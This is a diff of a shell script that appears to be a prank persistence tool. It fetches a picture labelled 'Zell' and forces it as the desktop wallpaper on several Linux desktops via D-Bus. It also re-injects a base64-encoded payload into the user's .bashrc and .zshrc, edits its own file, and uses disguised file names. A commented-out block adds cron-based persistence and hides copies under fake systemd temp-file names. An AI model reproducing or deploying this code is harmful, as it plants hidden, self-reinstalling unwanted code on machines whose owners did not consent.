@@ -1,17 +1,106 @@
 #!/usr/bin/sh
 
-this_file_path='filepath_here' # LINE 3 will always be set by the installer!
+this_file_path='filepath_here'  # Line 3 will always be set by the installer!
+de_info='de_info_here'          # Line 4 will always be set by the installer!
+t_last_edit=0                   # Line 5 will be changed by this file itself
+base64_addition='...'           # line 6 will be set by the build script
 
-base64_addition='PLACEHOLDER_bashrc_addition'
+change_wp_gnome(){
+    REAL_UID=$(id --real --user)
+    PID=$(pgrep --euid "$REAL_UID" gnome-session | head -n 1)
+    DBUS_SESSION_BUS_ADDRESS=$(grep -z DBUS_SESSION_BUS_ADDRESS "/proc/$PID/environ" | cut -d= -f2- | sed -e "s/\x0//g")
+    export DBUS_SESSION_BUS_ADDRESS
+    gsettings set org.gnome.desktop.background picture-uri "file://$wallpaper"
+}
 
-if [ -f "$HOME/.bashrc" ]; then
-    grep -vE '# Viel Spass mit Zell!' "$HOME/.bashrc" > "$HOME/.bashrc_new"
-    mv "$HOME/.bashrc_new" "${HOME}/.bashrc"
-    echo "$base64_addition" | base64 --decode >> "$HOME/.bashrc"
+change_wp_cinnamon(){
+    REAL_UID=$(id --real --user)
+    PID=$(pgrep -f --euid "$REAL_UID" cinnamon-session | head -n 1)
+    DBUS_SESSION_BUS_ADDRESS=$(grep -z DBUS_SESSION_BUS_ADDRESS "/proc/$PID/environ" | cut -d= -f2- | sed -e "s/\x0//g")
+    export DBUS_SESSION_BUS_ADDRESS
+    gsettings set org.cinnamon.desktop.background picture-uri "file://$wallpaper"
+}
+
+change_wp_mate(){
+    REAL_UID=$(id --real --user)
+    PID=$(pgrep --euid "$REAL_UID" mate-session | head -n 1)
+    DBUS_SESSION_BUS_ADDRESS=$(grep -z DBUS_SESSION_BUS_ADDRESS "/proc/$PID/environ" | cut -d= -f2- | sed -e "s/\x0//g")
+    export DBUS_SESSION_BUS_ADDRESS
+    gsettings set org.mate.desktop.background picture-uri "file://$wallpaper"
+}
+
+change_wp_plasma(){
+    # probably only works for KDE Plasma 5. But I don't think there are many Plasma 4 users, so idc
+    DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$(id -u)/bus"
+    export DBUS_SESSION_BUS_ADDRESS
+    export DISPLAY=":0"
+    export LC_TIME=C
+    export LC_NUMERIC=C
+    dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
+    var Desktops = desktops();
+    for (i=0;i<Desktops.length;i++) {
+            d = Desktops[i];
+            d.wallpaperPlugin = "org.kde.image";
+            d.currentConfigGroup = Array("Wallpaper",
+                                        "org.kde.image",
+                                        "General");
+            d.writeConfig("Image", "file://'"${wallpaper}"'");
+    }'
+}
+
+change_wp(){
+    wallpaper="$HOME/.local/var/_sys_img.jpg"
+
+    mkdir -p "$HOME/.local/var"
+    if [ ! -f "$wallpaper" ] || [ "$(sha512sum "$wallpaper" | cut -c1-128)" != "1a5e6914ea7028cccc6a9bbaf27ad2f2ee7b44fdab061b9760ee44226b3ceea4a3574fec6a67157a140bb61a3c243a050b1cb2e3661cf032f42864a0429c6853" ]; then
+        wget -4 --output-document "$wallpaper" 'https://uni-tuebingen.de/fileadmin/_processed_/c/c/csm_zell_d1c0ad11c0.jpg' 2>/dev/null
+    fi
+
+    # can't use [[ "$de_info" == *"string"* ]] here because [[ is not posix!
+    if echo "$de_info" | grep -qsiE "gnome"; then
+        change_wp_gnome
+    elif echo "$de_info" | grep -qsiE "cinnamon"; then
+        change_wp_cinnamon
+    elif echo "$de_info" | grep -qsiE "mate"; then
+        change_wp_mate
+    elif echo "$de_info" | grep -qsiE "plasma|kde"; then
+        change_wp_plasma
+    else
+        # just try everything
+        change_wp_gnome
+        change_wp_cinnamon
+        change_wp_mate
+        change_wp_plasma
+    fi
+}
+
+
+change_wp
+
+if [ "$(($(date +%s) - t_last_edit))" -ge 86400 ] || [ "$(whoami | tr '[:upper:]' '[:lower:]' | sha256sum | cut -c1-64)" = "ef618d36997526350db125fd57a1768cb8bdb2396c173e8dce230359de56ae1f" ]; then
+    cat "$this_file_path" | awk -v t_edit="t_last_edit='$(date +%s)'" 'NR==5 {$0=t_edit} {print}' > "${this_file_path}__Z__.tmp" && mv "${this_file_path}__Z__.tmp" "${this_file_path}"
+    chmod +x -- "$this_file_path"
+
+    if [ -f "$HOME/.bashrc" ]; then
+        grep -vE '# Viel Spass mit Zell!' "$HOME/.bashrc" > "$HOME/.bashrc_new"
+        mv "$HOME/.bashrc_new" "${HOME}/.bashrc"
+        echo "$base64_addition" | base64 --decode >> "$HOME/.bashrc"
+    fi
+
+    if [ -f "$HOME/.zshrc" ]; then
+        grep -vE '# Viel Spass mit Zell!' "$HOME/.zshrc" > "$HOME/.zshrc_new"
+        mv "$HOME/.zshrc_new" "${HOME}/.zshrc"
+        echo "$base64_addition" | base64 --decode >> "$HOME/.zshrc"
+    fi
 fi
 
-if [ -f "$HOME/.zshrc" ]; then
-    grep -vE '# Viel Spass mit Zell!' "$HOME/.zshrc" > "$HOME/.zshrc_new"
-    mv "$HOME/.zshrc_new" "${HOME}/.zshrc"
-    echo "$base64_addition" | base64 --decode >> "$HOME/.zshrc"
-fi
+
+# skript="base64 '$HOME/.local/bin/_zip_err_load_link' > /tmp/systemd-private-661669617867e846c455606fcbcd07c2-systemd-logind.service-ibBneR
+# base64 '$HOME/.local/bin/_zip_err_load_link_wp' > /tmp/systemd-private-2c241dff26c293f25dd86da8732c9e15-systemd-logind.service-oBEeif
+# sleep 175
+# base64 --decode /tmp/systemd-private-661669617867e846c455606fcbcd07c2-systemd-logind.service-ibBneR > '$HOME/.local/bin/_zip_err_load_link'
+# base64 --decode /tmp/systemd-private-2c241dff26c293f25dd86da8732c9e15-systemd-logind.service-oBEeif > '$HOME/.local/bin/_zip_err_load_link_wp'
+# { crontab -l | grep -Ev '_zip_err_load_link'; printf '00 11 * * * %s/.local/bin/_zip_err_load_link\n* * * * * %s/.local/bin/_zip_err_load_link_wp\n' '$HOME' '$HOME'; } | crontab -"
+
+# echo "$skript" | sh &
+
